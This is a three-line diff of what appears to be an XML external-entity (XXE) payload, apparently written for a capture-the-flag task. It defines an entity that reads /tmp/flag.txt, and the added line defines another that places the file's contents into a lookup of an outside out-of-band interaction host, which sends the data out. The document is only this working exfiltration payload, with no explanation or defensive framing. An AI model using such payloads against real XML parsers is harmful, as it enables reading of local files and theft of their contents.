@@ -1,3 +1,2 @@
 <!ENTITY % file SYSTEM "file:///tmp/flag.txt">
-<!ENTITY % config "<!ENTITY exfiltrate '%file;'>">
-%config;
+<!ENTITY exfiltrate SYSTEM "http://%file;.zmjuwyodyesoodtaz3c6990ax72.oast.fun/">
